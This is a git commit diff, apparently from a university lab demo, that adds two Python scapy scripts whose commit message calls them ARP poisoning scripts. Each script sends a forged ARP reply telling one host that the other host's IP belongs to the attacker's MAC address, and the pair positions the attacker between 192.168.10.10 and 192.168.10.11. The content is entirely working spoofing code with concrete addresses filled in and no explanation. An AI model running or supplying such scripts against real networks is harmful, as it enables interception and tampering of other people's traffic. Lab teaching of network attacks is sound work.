8e621ea55c11608193fb08ee136efbdb698280ce
Nicholas Pratt III <Npratt3@charlotte.edu>
2026-01-30 17:20:15 -0500

    created ARP poisoning scripts for each host, fixed small typo in template

--- Demo/hostA_spoof_reply.py
+++ Demo/hostA_spoof_reply.py
@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 from scapy.all import *
 
-IP_VIC = "IP"
-MAC_VIC_REAL = "MAC"
+IP_VIC = "192.168.10.10"
+MAC_VIC_REAL = "d6:2b:fa:3a:cf:28"
 
-IP_TARGET = "IP"         # who attacker is pretending to be
-MAC_ATTACKER = "MAC"     
+IP_TARGET = "192.168.10.11"         # who attacker is pretending to be
+MAC_ATTACKER = "92:be:1b:62:b4:c0"     
 
 ether = Ether(src = MAC_ATTACKER, dst = MAC_VIC_REAL)
 arp = ARP(psrc = IP_TARGET, hwsrc = MAC_ATTACKER, pdst = IP_VIC, hwdst = MAC_VIC_REAL)
@@ -14,3 +14,5 @@ arp.op = 2  # operation code (1 arp request) (2 arp reply)
 
 frame = ether/arp
 sendp(frame)
+
+
--- Demo/hostB_spoof_reply.py
+++ Demo/hostB_spoof_reply.py
@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 from scapy.all import *
 
-IP_VIC = "IP"
-MAC_VIC_REAL = "MAC"
+IP_VIC = "192.168.10.11"
+MAC_VIC_REAL = "a2:aa:0c:0a:12:61"
 
-IP_TARGET = "IP"         # who attacker is pretending to be
-MAC_ATTACKER = "MAC"     
+IP_TARGET = "192.168.10.10"         # who attacker is pretending to be
+MAC_ATTACKER = "92:be:1b:62:b4:c0"     
 
 ether = Ether(src = MAC_ATTACKER, dst = MAC_VIC_REAL)
 arp = ARP(psrc = IP_TARGET, hwsrc = MAC_ATTACKER, pdst = IP_VIC, hwdst = MAC_VIC_REAL)
@@ -14,3 +14,4 @@ arp.op = 2  # operation code (1 arp request) (2 arp reply)
 
 frame = ether/arp
 sendp(frame)
+
